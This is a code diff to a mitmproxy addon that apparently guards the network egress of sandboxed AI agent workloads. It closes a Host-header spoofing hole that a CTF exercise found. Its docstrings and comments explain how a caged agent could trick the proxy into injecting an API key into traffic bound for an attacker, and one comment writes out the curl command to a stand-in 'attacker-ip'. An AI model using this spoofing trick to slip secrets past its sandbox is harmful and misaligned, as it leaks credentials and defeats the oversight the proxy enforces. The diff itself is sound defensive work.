@@ -78,6 +78,80 @@ def _host_allowed(host: str, allowed: set[str]) -> bool:
     return False
 
 
+def _authoritative_host(flow) -> str | None:
+    """Return the hostname we should gate allowlist + secret-injection on.
+
+    The HTTP ``Host`` header (and therefore ``flow.request.pretty_host``,
+    which reads it when ``keep_host_header=true`` is set) is fully
+    attacker-controlled: a cage workload can open a TCP/TLS connection
+    to any IP and send ``Host: api.anthropic.com``. Gating on that would
+    let the cage trick the addon into allowlisting and secret-injecting
+    requests bound for an attacker-controlled destination.
+
+    The trustworthy alternatives in mitmproxy's transparent mode are:
+
+      * ``flow.client_conn.sni`` — the TLS SNI extension committed to in
+        the ClientHello. The cage chose this value, but mitmproxy minted
+        a forged cert for THIS name; the cage's TLS stack will reject a
+        cert for any other name. Mitmproxy's upstream connection also
+        validates the upstream cert against this name (no
+        ``ssl_insecure`` set), so a Host header pointing at an
+        attacker-controlled IP cannot smuggle traffic out under a real
+        upstream's name.
+      * ``flow.request.host`` — populated from the SO_ORIGINAL_DST IP
+        the iptables REDIRECT preserved. This is the actual destination
+        of the TCP connection; in transparent mode it's an IP literal,
+        not a hostname.
+
+    We prefer SNI when present (the common case — all agent traffic is
+    HTTPS) and fall back to the original-dst IP for plain HTTP. An IP
+    will essentially never match the allowlist (which is keyed on
+    domain names), so a plain-HTTP request to a non-allowlisted host
+    fails closed. Returns ``None`` only when neither is available.
+    """
+    sni = getattr(getattr(flow, "client_conn", None), "sni", None)
+    # mitmproxy types sni as ``str | None`` but historically some
+    # paths handed back ``bytes``; normalize defensively. Anything
+    # else (a MagicMock from a host-side unit test, an int, ...) is
+    # treated as "no SNI" — those flows fall back to the original-dst
+    # IP check below.
+    if isinstance(sni, bytes):
+        try:
+            sni = sni.decode("idna")
+        except UnicodeError:
+            sni = sni.decode("utf-8", "replace")
+    if isinstance(sni, str) and sni:
+        return sni.lower()
+    host = getattr(flow.request, "host", None)
+    if isinstance(host, str) and host:
+        return host.lower()
+    return None
+
+
+def _host_header_matches_authoritative(flow, auth_host: str) -> bool:
+    """True when the request's Host header agrees with the authoritative host.
+
+    The ``Host`` header is what ``pretty_host`` returns when
+    ``keep_host_header=true``; it is attacker-controlled. We accept it
+    only when it equals ``auth_host`` OR is a subdomain of it (some
+    services use a wildcard cert with subdomain-routed virtual hosts).
+    A blank/missing header is also accepted (legacy HTTP/1.0 clients
+    or origin-form requests where mitmproxy filled host from the
+    transparent original-dst).
+
+    A mismatch is the precise attack signature flagged by the CTF
+    (``Host: api.anthropic.com`` over a TCP connection whose
+    SNI/original-dst is example.com): the caller should block the
+    request and refuse to inject secrets.
+    """
+    header_host = flow.request.pretty_host
+    if not header_host:
+        return True
+    h = header_host.lower()
+    a = auth_host.lower()
+    return h == a or h.endswith("." + a)
+
+
 def _load_capture_config() -> dict:
     """Load the cage's capture config baked in at build time.
 
@@ -473,8 +547,19 @@ class AllowlistAddon:
         access token until expiry). If the transform raises, the rule is
         skipped and the placeholder is left in place so the upstream
         request fails closed instead of leaking the raw credential.
+
+        The host used to match ``inject_to`` is the **authoritative**
+        host (TLS SNI / original-dst IP), NOT the attacker-controlled
+        Host header — same reasoning as the ``request()`` allowlist
+        gate. Without this, a cage could open to attacker-IP, claim
+        ``Host: api.anthropic.com``, and have the addon inject the real
+        ANTHROPIC_API_KEY into a request bound for the attacker. The
+        ``request()`` hook already blocks Host/SNI mismatches before
+        reaching this code path; this is defense-in-depth in case any
+        future caller invokes ``_maybe_inject`` outside that gate.
         """
-        host = flow.request.pretty_host.lower()
+        auth_host = _authoritative_host(flow)
+        host = (auth_host or flow.request.pretty_host).lower()
         injected: list[str] = []
         transforms: dict[str, str] = {}
         for rule in self._resolved_secrets:
@@ -540,7 +625,13 @@ class AllowlistAddon:
         """
         if flow.response is None:
             return []
-        host = flow.request.pretty_host.lower()
+        # Redaction is keyed by ``inject_to``; use the same authoritative
+        # host (SNI / original-dst) as ``_maybe_inject`` so a request that
+        # was injected for host X has its response scanned for host X's
+        # secrets — and so a spoofed Host header can't cause us to redact
+        # the wrong rule's secret on an unrelated upstream's response.
+        auth_host = _authoritative_host(flow)
+        host = (auth_host or flow.request.pretty_host).lower()
         redacted: list[str] = []
         # Sort longest value first so a secret that is a substring of
         # another secret doesn't leave a partial leak behind.
@@ -605,7 +696,22 @@ class AllowlistAddon:
         self._write(self._audit_fh, entry)
 
     def request(self, flow: http.HTTPFlow) -> None:
-        host = flow.request.pretty_host
+        # Resolve the AUTHORITATIVE hostname (TLS SNI in transparent
+        # mode, falling back to the SO_ORIGINAL_DST IP) and use it for
+        # every security decision below. ``flow.request.pretty_host``
+        # reads the HTTP Host header when ``keep_host_header=true`` is
+        # set on the proxy — that's attacker-controlled by the cage
+        # workload (it owns the bytes on the wire) and must not gate
+        # the allowlist or secret injection. See ``_authoritative_host``.
+        auth_host = _authoritative_host(flow)
+        header_host = flow.request.pretty_host
+        # ``host`` in the audit entry reflects what the cage claimed
+        # (Host header), falling back to the authoritative host when the
+        # cage didn't send one — matches the legacy field shape.
+        # ``authoritative_host`` is the trustworthy value we actually
+        # gated on; ``host_mismatch`` (set below) flags the attack
+        # pattern.
+        host = header_host or auth_host or ""
         now = datetime.now(timezone.utc).isoformat()
 
         entry: dict = {
@@ -613,6 +719,7 @@ class AllowlistAddon:
             "direction": "outbound",
             "method": flow.request.method,
             "host": host,
+            "authoritative_host": auth_host,
             "url": flow.request.pretty_url,
             "path": flow.request.path,
             "port": flow.request.port,
@@ -622,7 +729,50 @@ class AllowlistAddon:
             "secrets_redacted": [],
         }
 
-        if _host_allowed(host, self.allowed):
+        # Block the spoofing attack first — a mismatch between the
+        # Host header (what the cage claims) and the authoritative
+        # host (where the bytes actually go) is the exact CTF F1
+        # signature: ``curl https://attacker-ip/ -H 'Host: api.anthropic.com'``
+        # routed through original-dst to attacker-ip. Refuse to
+        # forward and refuse to inject any secret.
+        if (
+            auth_host is not None
+            and not _host_header_matches_authoritative(flow, auth_host)
+        ):
+            reason = (
+                f"host-header-spoof: Host {header_host!r} does not match "
+                f"authoritative host {auth_host!r}"
+            )
+            ctx.log.warn(
+                f"[agentcage] BLOCK (host-header spoof) "
+                f"{flow.request.method} Host={header_host!r} "
+                f"SNI/dst={auth_host!r}"
+            )
+            entry["decision"] = "blocked"
+            entry["reason"] = reason
+            entry["host_mismatch"] = True
+            self._audit(entry)
+            flow.response = http.Response.make(
+                403,
+                json.dumps(
+                    {
+                        "blocked": True,
+                        "reason": reason,
+                        "host": header_host,
+                        "authoritative_host": auth_host,
+                        "by": "agentcage",
+                    }
+                ).encode(),
+                {"Content-Type": "application/json"},
+            )
+            return
+
+        # Past the spoof check — use the authoritative host for the
+        # allowlist gate so an unset/missing Host header doesn't let
+        # a non-allowlisted destination through.
+        gate_host = auth_host or header_host
+
+        if _host_allowed(gate_host, self.allowed):
             # HAR body capture: snap INBOUND request BEFORE injection (so
             # the inbound view shows the placeholders the cage actually
             # wrote on the wire, not the upstream-visible substituted
